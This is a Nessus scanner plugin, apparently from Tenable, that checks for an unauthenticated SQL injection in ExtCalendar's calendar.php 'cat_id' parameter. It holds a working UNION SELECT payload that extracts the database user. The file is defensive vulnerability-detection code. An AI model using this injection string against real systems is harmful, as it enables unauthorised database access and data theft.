#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(51675);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2014/08/09 00:11:22 $");

  script_bugtraq_id(45746);
  script_xref(name:"EDB-ID", value:"15966");

  script_name(english:"ExtCalendar 'cat_id' parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via the 'cat_id' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by
a SQL injection vulnerability."
  );
  script_set_attribute(attribute:"description", value:
"The version of the ExtCalendar installed on the remote host is
affected by a SQL injection vulnerability.

The application fails to properly sanitize user-supplied input to the
'cat_id' parameter of the 'calendar.php' script before using it in a
database query.

Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated
remote attacker can leverage this issue to launch a SQL injection
attack against the affected application, leading to authentication
bypass, discovery of sensitive information, attacks against the
underlying database, and the like."
  );

  script_set_attribute(
    attribute:"solution",
    value:
"Either remove the affected install or switch to another application
as ExtCalendar is no longer actively maintained."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/01/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/01/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:extcalendar:extcalendar");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2014 Tenable Network Security, Inc.");

  script_dependencies("extcalendar_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/extcalendar", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      :'extcalendar',
  port         :port,
  exit_on_fail :TRUE
);

# Attempt to exploit the vulnerability.
payload = "NESSUS says database user is:";
exploit = "'+UNION+SELECT+concat('"+urlencode(str:payload)+"',user()),'junk'+--+";

dir = install['dir'];
url = dir +
      '/calendar.php?mode=cat&cat_id='+exploit;

r = http_send_recv3(
  method       :"GET",
  item         :url,
  port         :port,
  exit_on_fail :TRUE
);

if (
  "<title>Events under '"+payload >< r[2] &&
  '<a href="calendar.php?mode=day" title="Daily View"' >< r[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else
  exit(0, 'The remote ExtCalendar install at '+build_url(qs:dir+'/', port:port)+ ' is not affected.');
